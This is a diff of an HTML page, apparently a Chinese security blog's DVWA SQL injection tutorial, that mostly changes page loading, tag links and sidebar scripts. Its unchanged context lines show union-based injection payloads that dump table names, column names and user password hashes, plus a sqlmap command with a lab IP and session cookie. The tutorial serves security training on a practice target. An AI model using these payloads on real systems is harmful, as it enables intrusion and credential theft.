@@ -6,8 +6,10 @@
 <title>DVWA 靶场 SQL Injection（SQL 注入）全难度教程（附代码分析） - 信息安全实验室</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="../assets/style.css">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&amp;family=Noto+Sans+SC:wght@400;500;700&amp;family=Titillium+Web:wght@400;600;700&amp;display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&amp;family=Noto+Sans+SC:wght@400;500;700&amp;family=Titillium+Web:wght@400;600;700&amp;display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
 </head>
 <body>
 <div class="scanline"></div>
@@ -45,9 +47,9 @@
   <div class="post-date">2023 // 04 / 04</div>
   <div class="post-title">DVWA 靶场 SQL Injection（SQL 注入）全难度教程（附代码分析）</div>
   <div class="post-tags">
-    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
-    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
-    <span class="post-tag" style="background:#8b5cf622;color:#8b5cf6;border:1px solid #8b5cf644">SQL注入</span>
+    <a href="../tags/list.html?tag=Web安全" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</a>
+    <a href="../tags/list.html?tag=DVWA" class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</a>
+    <a href="../tags/list.html?tag=SQL注入" class="post-tag" style="background:#8b5cf622;color:#8b5cf6;border:1px solid #8b5cf644">SQL注入</a>
   </div>
 </div>
 
@@ -89,49 +91,49 @@
 
 <pre><code>1'</code></pre>
 
-<p><img src="../assets/si_image001.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image001.png" alt="" style="max-width:100%"></p>
 
 <p>发现报错，存在注入点。使用 <code>1' or 1=1 #</code> 判断：</p>
 
 <pre><code>1' or 1=1 #</code></pre>
 
-<p><img src="../assets/si_image002.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image002.png" alt="" style="max-width:100%"></p>
 
 <p>判断回显字段数（尝试 3）：</p>
 
 <pre><code>1' union select 1,2,3 #</code></pre>
 
-<p><img src="../assets/si_image003.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image003.png" alt="" style="max-width:100%"></p>
 
 <p>报错了，说明字段数为 2：</p>
 
 <pre><code>1' union select 1,2 #</code></pre>
 
-<p><img src="../assets/si_image004.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image004.png" alt="" style="max-width:100%"></p>
 
 <p>查询版本和数据库名：</p>
 
 <pre><code>-1' union select database(),version() #</code></pre>
 
-<p><img src="../assets/si_image005.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image005.png" alt="" style="max-width:100%"></p>
 
 <p>获取所有表名：</p>
 
 <pre><code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></pre>
 
-<p><img src="../assets/si_image006.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image006.png" alt="" style="max-width:100%"></p>
 
 <p>获取 users 表的列名：</p>
 
 <pre><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</code></pre>
 
-<p><img src="../assets/si_image007.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image007.png" alt="" style="max-width:100%"></p>
 
 <p>获取 user 和 password 数据：</p>
 
 <pre><code>-1' union select 1,group_concat(user,password) from users #</code></pre>
 
-<p><img src="../assets/si_image008.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image008.png" alt="" style="max-width:100%"></p>
 
 <p>密码为 MD5 加密，可在线解密或使用 hashcat 破解。</p>
 
@@ -139,11 +141,11 @@
 
 <p>使用 sqlmap 自动化注入。先抓包获取 Cookie：</p>
 
-<p><img src="../assets/si_image009.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image009.png" alt="" style="max-width:100%"></p>
 
 <pre><code>sqlmap -u "http://192.168.21.149/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=9i79dn4ugiv0vc6gm25352at83" --batch</code></pre>
 
-<p><img src="../assets/si_image010.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image010.png" alt="" style="max-width:100%"></p>
 
 <p>后续操作与 sqli-labs 靶场相同。</p>
 
@@ -153,11 +155,11 @@
 
 <p>Medium 级别将请求方式从 GET 改为了 POST：</p>
 
-<p><img src="../assets/si_image011.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image011.png" alt="" style="max-width:100%"></p>
 
 <p>抓包修改 id 参数即可进行注入：</p>
 
-<p><img src="../assets/si_image012.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image012.png" alt="" style="max-width:100%"></p>
 
 <p>后续注入方法与 Low 相同。</p>
 
@@ -195,7 +197,7 @@ if( isset( $_POST[ 'Submit' ] ) ) {
 
 <p>返回结果输出在原来的界面上，注入方法与 Low 相同：</p>
 
-<p><img src="../assets/si_image013.png" alt="" style="max-width:100%"></p>
+<p><img loading="lazy" src="../assets/si_image013.png" alt="" style="max-width:100%"></p>
 
 <h5 id="high-code">代码分析</h5>
 
@@ -314,67 +316,6 @@ generateSessionToken();
 </div>
 
 <script>
-const html = document.documentElement;
-const themeBtn = document.getElementById('themeToggle');
-const themeDock = document.getElementById('themeDock');
-const themeIcons = { dark: '☽', light: '☀', crystal: '◇', ego: '♢', rei: 'レ' };
-const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-let qToggle = 'light';
-function setTheme(t) {
-  html.setAttribute('data-theme', t);
-  localStorage.setItem('theme', t);
-  themeBtn.textContent = themeIcons[t] || '☽';
-  document.querySelectorAll('.theme-dock-item').forEach(el => el.classList.toggle('active', el.dataset.theme === t));
-  if (t === 'dark') qToggle = 'light';
-  else if (t === 'light') qToggle = 'dark';
-  else if (t === 'rei') qToggle = 'dark';
-  else qToggle = 'dark';
-}
-const saved = localStorage.getItem('theme') || 'dark';
-setTheme(saved);
-if (saved === 'dark' || saved === 'light') qToggle = saved === 'dark' ? 'light' : 'dark';
-else if (saved === 'rei') qToggle = 'dark';
-document.querySelectorAll('.theme-dock-item').forEach(el =>
-  el.addEventListener('click', () => { setTheme(el.dataset.theme); themeDock.classList.remove('visible'); })
-);
-themeBtn.addEventListener('click', () => {
-  if (isTouch) { themeDock.classList.toggle('visible'); }
-  else { setTheme(qToggle); themeDock.classList.remove('visible'); }
-});
-if (!isTouch) {
-  let dockTimer;
-  const showDock = () => { clearTimeout(dockTimer); themeDock.classList.add('visible'); };
-  const hideDock = () => { dockTimer = setTimeout(() => themeDock.classList.remove('visible'), 100); };
-  themeBtn.addEventListener('mouseenter', showDock);
-  themeBtn.addEventListener('mouseleave', hideDock);
-  themeDock.addEventListener('mouseenter', showDock);
-  themeDock.addEventListener('mouseleave', hideDock);
-}
-document.addEventListener('click', e => {
-  if (!themeDock.contains(e.target) && e.target !== themeBtn) themeDock.classList.remove('visible');
-});
-const topBtn = document.getElementById('backToTop');
-topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
-
-/* sticky nav */
-const navSentinel = document.getElementById('navSentinel');
-const navWrap = document.getElementById('navWrap');
-let navSpacer = null;
-const navObs = new IntersectionObserver(([e]) => {
-  const stuck = !e.isIntersecting;
-  navWrap.classList.toggle('fixed', stuck);
-  if (stuck && !navSpacer) {
-    navSpacer = document.createElement('div');
-    navSpacer.style.height = navWrap.offsetHeight + 'px';
-    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
-  } else if (!stuck && navSpacer) {
-    navSpacer.remove(); navSpacer = null;
-  }
-}, { threshold: [0] });
-navObs.observe(navSentinel);
-
-/* TOC active highlight */
 const tocLinks = document.querySelectorAll('.post-toc a');
 const tocTargets = [];
 tocLinks.forEach(a => {
@@ -447,5 +388,35 @@ document.querySelectorAll('.post-content pre').forEach(pre => {
 });
 </script>
 
-</body>
+<div class="graph-sidebar" id="graphSidebar">
+  <div class="graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("graphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var obs=new IntersectionObserver(function(entries){
+  if(!entries[0].isIntersecting)return;
+  obs.disconnect();
+  var s=document.createElement("script");
+  s.src="../assets/vis-network.min.js";
+  s.onload=function(){
+    var d=document.createElement("script");
+    d.src="../assets/posts-data.js";
+    d.onload=function(){
+      var p=document.createElement("script");
+      p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+      document.body.appendChild(p);
+      var g=document.createElement("script");
+      g.src="../assets/graph.js";
+      document.body.appendChild(g);
+    };
+    document.body.appendChild(d);
+  };
+  document.body.appendChild(s);
+},{rootMargin:"200px"});
+obs.observe(gs);
+})();
+</script>
+<script src="../assets/common.js"></script></body>
 </html>
